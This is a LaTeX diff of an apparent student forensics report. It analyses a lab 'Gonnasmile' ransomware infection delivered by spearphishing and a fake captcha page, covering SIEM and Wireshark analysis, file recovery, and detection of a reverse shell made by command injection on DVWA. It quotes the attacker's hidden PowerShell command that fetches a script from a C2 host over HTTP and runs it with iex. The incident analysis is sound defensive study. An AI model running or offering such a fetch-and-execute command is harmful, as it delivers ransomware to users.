@@ -4,5 +4,306 @@
 
 \subsection{Digital Forensics}
 
+\subsubsection{Target Machine Examination}
+The group which apparently conducted  attack calls their ransomware \enquote{Gonnasmile} (see \cref{for_wallpaper}). They claim that the victim's files have been encrypted, and that they can find instructions to recover them in the text file placed on the Desktop.
+
+\begin{figure}[!htb]
+	\includegraphics[width=\linewidth]{forensics/1_assessment/desktop}
+	\caption{Victim's desktop wallpaper post attack}
+	\label{for_wallpaper}
+\end{figure}
+
+The text file contains a ransom note that demands 500\$ to be sent to a cryptocurrency wallet (see \cref{ransom}).
+\begin{figure}[!htb]
+	\includegraphics[width=\linewidth]{forensics/1_assessment/ransom}
+	\caption{Gonnasmile ransom note}
+	\label{ransom}
+\end{figure}
+
+The files in the user's \textit{Documents} folder have a \textit{.encrypted} file ending, and are illegible (see \cref{document_encr_ex}). All documents render in the same manner (see Appendix, \cref{encr1,encr2}), displaying either placeholder or Chinese characters.
+
+Trying different encodings to display the file contents didn't yield legible results, meaning the files were most likely actually cryptographically altered instead of having just their encodings changed, lending credence to the claim of encryption in the ransom note.
+\begin{figure}[!htb]
+	\includegraphics[width=\linewidth]{forensics/1_assessment/documents}
+	\caption{Example of encrypted file}
+	\label{document_encr_ex}
+\end{figure}
+
+\subsubsection{Compromise Indicator Assessment}
+Assessing the victim's E-Mail inbox reveals a Phishing E-Mail (see \cref{fish_mail}). The attackers used the \textit{Phishing: Spearphishing Link (T1566.002)} \autocite{mitre:attack:T1566:002} technique to target the victim.
+
+They posed as Microsoft Support by using an E-Mail made to look similar to a real support account (see \cref{fish_mail_mail}). The E-Mail contained a hyperlink, which contained the attacker's C2-Server's address and the port the server ran on: (\textit{IP:192.168.61.26, Port: 8080)} (see \cref{fish_mail_c2}). 
+The attackers created fake urgency by claiming the user's account had been compromised, leading them to fall victim to the Phishing tactic.
+
+\begin{figure}[!htb]
+	\centering
+	\includegraphics[width=\linewidth]{forensics/2_fish/fish}
+	\caption{Spearphishing E-Mail containing malicious link}
+	\label{fish_mail}
+\end{figure}
+
+\vspace{4mm}
+
+\begin{figure}[!htb]
+	\centering
+	\includegraphics[width=0.6\linewidth]{forensics/2_fish/fish_mail}
+	\caption{Spearphishing E-Mail address impersonating Microsoft support}
+	\label{fish_mail_mail}
+\end{figure}
+
+\vspace{4mm}
+
+\begin{figure}[!htb]
+	\centering
+	\includegraphics[width=\linewidth]{forensics/2_fish/fish_real}
+	\caption{Spearphishing E-Mail as plain text containing malicious link}
+	\label{fish_mail_c2}
+\end{figure}
+
+\newpage
+\clearpage
+\begin{landscape}
+\subsubsection{SIEM Analysis} \label{siem_fish}
+Filtering for the timeframe the incident occurred in (see \cref{fish_filet}), as well as for \enquote{Process Creation} events via EventID \textit{1}, revealed the command which enabled the ransomware to encrypt the system's files (see \cref{fish_reste}, later split into \cref{fish_script} - \cref{fish_time} for better legibility).
+
+\begin{figure}[!htb]
+	\centering
+	\includegraphics[width=\linewidth]{forensics/3_siem/filter}
+	\caption{\textit{Elastic} filter}
+	\label{fish_filet}
+\end{figure}
+
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[height=3.5cm,width=1.15\linewidth]{forensics/3_siem/res}
+	}
+	\caption{\textit{Elastic} log of incident}
+	\label{fish_reste}
+\end{figure}
+
+The command seemingly responsible for the incident seems to be a PowerShell process started in the background with the \enquote{hidden} flag \autocite{microsoft:pwshll_hid} (see \cref{fish_reste}, marked red) (\textit{\textbackslash Powershell.exe" -w hidden}), which downloads the file \textit{download.txt} from the previously discovered C2-server via HTTP \autocite{microsoft:iwr} (\textit{iwr 'http://192.168.61.26:8080/download.txt'}) and executes the instructions contained in the downloaded file \autocite{microsoft:iex} (\textit{'iex (...).Content}).
+
+The computer the command ran on was called \textit{DESKTOP-FEA5EJA} (see \cref{fish_reste}, marked green).
+
+The command had the timestamp \textit{January 13, 2025, at 17:28:40.321369200}. (see \cref{fish_reste}, marked cyan).
+
+\end{landscape}
+\newpage
+\clearpage
+
+\subsubsection{Network Traffic Analysis}
+The display filter (see \cref{shark_filter}) was chosen with the following reasoning based on the information collected prior \autocite{wireshark:disp}:
+\begin{itemize}
+\itemBF{http}
+The attacker sent the payload via HTTP, so filtering for that protocol would limit the results to the packets using the same protocol the attacker employed.
+\itemBF{ip.addr==192.168.61.26}
+Filtering for packets originating from and addressed to the C2 server returned those packets the server sent and received during the incident.
+\itemBF{tcp.port==8080}
+The C2 server was known to be running on port 8080, therefore limiting the displayed traffic to packets addressed to that port would further narrow results down. 
+\end{itemize}
+
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=0.8\linewidth]{forensics/4_shark/shark_filter}
+	}
+	\caption{\textit{Wireshark} filter}
+	\label{shark_filter}
+\end{figure}
+
+If this filter had still returned too many packers, the filter \textit{http.request.uri matches "download.txt"} could have been used to show just the packets containing the payload script. The filter limited the results enough to enable the relevant packet to be identified (see \cref{shark_load}).
+Following the HTTP stream revealed the downloaded text file, containing the ransomware in form of a \textit{PowerShell} script.
+The extracted script can be viewed in the appended files under:\\
+{
+\small \textit{Assignment 3 - Digital Forensics $\longrightarrow$ Wireshark Trace  $\longrightarrow$ download.ps1}
+}
+\normalsize
+The attacker uses a SimpleHTTP Python server, running on Python version 3.11.2 (see \cref{shark_serv}).
+The script encrypts the following file types, while explicitly excluding packet capture (\textit{.pcap}) files (see \cref{shark_inc_ex}, marked red):
+\begin{itemize}
+\begin{multicols}{3}
+\item{Text files (\textit{.txt})}
+\item{Microsoft Word files (\textit{.docx}}
+\item{Microsoft Excel files (\textit{.xlsx})}
+\end{multicols}
+\end{itemize}
+The generated encryption key and initialization vector (see \cref{shark_inc_ex}, marked green) are written to a key file in the users home directory (see \cref{shark_inc_ex}, marked cyan).
+
+
+\newpage
+\clearpage
+\begin{landscape}
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=0.8\linewidth]{forensics/4_shark/server}
+	}
+	\caption{Server used by the attacker}
+	\label{shark_serv}
+\end{figure}
+
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=1.15\linewidth]{forensics/4_shark/incex}
+	}
+	\caption{File types included and excluded by the payload}
+	\label{shark_inc_ex}
+\end{figure}
+\end{landscape}
+\newpage
+\clearpage
+
+\newpage
+\clearpage
+\begin{landscape}
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=1.15\linewidth]{forensics/4_shark/shark}
+	}
+	\caption{Wireshark trace after filtering}
+	\label{shark_load}
+\end{figure}
+\end{landscape}
+\newpage
+\clearpage
+
+
+The key and initialization vector were written to the following file (see \cref{shark_key_file}):\\
+\textit{C:\textbackslash Users\textbackslash User\textbackslash encryption\_key.txt1}
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=0.6\linewidth]{forensics/4_shark/key}
+	}
+	\caption{Key file location}
+	\label{shark_key_file}
+\end{figure}
+
+ChatGPT was prompted to create a script which reverses the encryption process (see Appendix, \cref{chatlog_small} - \cref{chatlog_prompt}). The script was then altered to additionally revert the wallpaper change, remove the created files (ransom note, key file, wallpaper). 
+A prompt for user input was added as well to enable the \textit{PowerShell} process to be captured (see \cref{encr_script}).
+A default wallpaper was chosen since it was not apparent which wallpaper the user had before the incident and the script was executed (see \cref{encr_restr}).
+The decrypted files have been opened to prove that they have been decrypted (see Appendix, \cref{decrypted_files}).
+The script can be viewed in the appended files under:\\
+{
+\small \textit{Assignment 3 - Digital Forensics $\longrightarrow$ Recovery Script $\longrightarrow$ reverse.ps1}
+}
+
+\subsubsection{Attack Validation}
+Clicking on the link in the Phishing E-Mail opened the attacker's website, prompting the user to supposedly authenticate themselves. The received source code was assessed in the browser's network tab before continuing to interact with the website. This revealed that clicking on the presented button creates a popup with instructions to compromise the system (see \cref{captchga}). The button's onClick-handler calls a function \textit{verify()}, which drops the \textit{PowerShell} command discussed in \fullref{siem_fish} into the user's clipboard and creates a pop-up with instructions to execute it (see \cref{clipboard}).
+
+The victim must have therefore clicked on the link, then clicked on the fake \textit{Captcha} button, followed the steps laid out in the popup, which led to the system fetching the script from the C2 server resulting in the victim's files being encrypted, which can be classified as \textit{Data Encrypted for Impact (T1486)} \autocite{mitre:attack:T1486}.
+
+\newpage \clearpage
+\begin{landscape}
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=1.12\linewidth]{forensics/5_reverse/4_restore}
+	}
+	\caption{Original target machine state restored with default wallpaper}
+	\label{encr_restr}
+\end{figure}
+\end{landscape}
+\newpage \clearpage
+
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=1.18\linewidth]{forensics/5_reverse/script}
+	}
+	\caption{Script to undo the attack's damages}
+	\label{encr_script}
+\end{figure}
+
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=0.75\linewidth]{forensics/6_fished/captchga}
+	}
+	\caption{Attacker's Phishing page}
+	\label{captchga}
+\end{figure}
+
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=\linewidth]{forensics/6_fished/clipboard}
+	}
+	\caption{Popup instructing user to execute \textit{PowerShell} command stored in clipboard}
+	\label{clipboard}
+\end{figure}
+
+\subsubsection{Reverse Shell Attack Analysis}
+%TODO add technique
+To be able to analyze creates a reverse shell attack in the provided SIEM system, a Command Injection was conducted on the provided DVWA server (see \cref{fishiens}). 
+
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=\linewidth]{forensics/7_siem2/reverse_final}
+	}
+	\caption{Creating a reverse shell via Command Injection}
+	\label{fishiens}
+\end{figure}
+
+There are a few indicators that make this occurrence suspicious:
+\begin{enumerate}
+\itemBF{A webserver spawns a bash process}
+This can happen naturally if the webserver needs to execute programs, but is already a little suspicious (see \cref{shell_spawn}).
+\itemBF{The executed commands are suspicious}
+Commands like \textit{whoami} should most likely not be run by a webserver, indicating an attacker has logged on (see \cref{whoami}).
+\itemBF{Recorded reverse shell command}
+A webserver should not establish an outbound connection via netcat (see \cref{nccommand}).
+\end{enumerate}
+
+\newpage \clearpage
+\begin{landscape}
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=1.2\linewidth]{forensics/7_siem2/analyzer}
+	}
+	\caption{Complete SIEM results}
+	\label{raaaaaaaaa}
+\end{figure}
+
+Relevant results from \cref{raaaaaaaaa} will be split into more legible cutouts on the following pages.
+\end{landscape}
+\newpage \clearpage
+
+
+\newpage \clearpage
+\begin{landscape}
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=0.9\linewidth]{forensics/7_siem2/shell_spawn}
+	}
+	\caption{Bash process spawn recorded by SIEM}
+	\label{whoami}
+\end{figure}
+
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=0.4\linewidth]{forensics/7_siem2/whoami}
+	}
+	\caption{whoami command recorded by SIEM}
+	\label{shell_spawn}
+\end{figure}
+
+\begin{figure}[!htb]
+	\centering
+	\makebox[\linewidth][c]{%
+		\includegraphics[width=0.6\linewidth]{forensics/7_siem2/command}
+	}
+	\caption{Reverse shell command recorded by SIEM}
+	\label{nccommand}
+\end{figure}
+\end{landscape}
+\newpage \clearpage
 
 \end{document}
